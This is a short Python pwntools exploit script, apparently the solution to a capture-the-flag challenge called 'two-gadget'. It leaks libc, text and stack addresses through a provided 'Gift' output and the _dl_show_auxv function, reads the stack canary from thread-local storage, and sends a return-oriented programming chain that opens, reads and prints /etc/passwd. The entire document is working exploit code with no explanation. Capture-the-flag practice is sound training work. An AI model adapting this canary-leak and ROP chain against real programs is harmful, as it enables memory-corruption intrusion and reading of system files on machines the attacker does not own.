#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('../chal/two-gadget')

raw_input('>')

p.recvuntil(b'Gift: ')
libc = int(p.recvline()[:-1], 16) - 0x87e60

log.info(f'libc: {hex(libc)}')

read = libc + 0x111130
open = libc + 0x110e50
write = libc + 0x1111d0
ret = libc + 0x25679
_dl_show_auxv = libc + 0x266020
mov_dh_16  = libc + 0xafa15
pop_rdi = libc + 0x26b72
pop_rsi = libc + 0x27529
pop_rdx_r12 = libc + 0x11c371
tls = libc - 0x28c0
canary = tls + 0x28

p.send(p64(_dl_show_auxv))
p.recvuntil(b'AT_ENTRY:')
text = int(p.recvline()[:-1].replace(b' ', b''), 16)
p.recvuntil(b'AT_RANDOM:')
stack = int(p.recvline()[:-1].replace(b' ', b''), 16)
p.recv(timeout=1)

log.info(f'text : {hex(text)}')
log.info(f'stack: {hex(stack)}')

p.send(p64(canary))

canary = u64(p.recv(8))

log.info(f'canary: {hex(canary)}')

rbp = 0
payload  = b'a' * 8
payload += p64(canary)
payload += p64(rbp)
payload += flat(
    mov_dh_16,
    read,
)
raw_input('>')
p.send(payload)

payload  = b'/etc/passwd\0' # stack - 0x2f9
payload  = payload.ljust(0x28, b'\0')
payload += flat(
    pop_rdx_r12,
    0,
    0,
    pop_rsi,
    0,
    pop_rdi,
    stack - 0x2f9,
    open,
    pop_rdx_r12,
    0x100,
    0,
    pop_rsi,
    stack,
    pop_rdi,
    3,
    read,
    pop_rdx_r12,
    0x100,
    0,
    pop_rsi,
    stack,
    pop_rdi,
    1,
    write,
)
raw_input('>')
p.send(payload)

p.interactive()
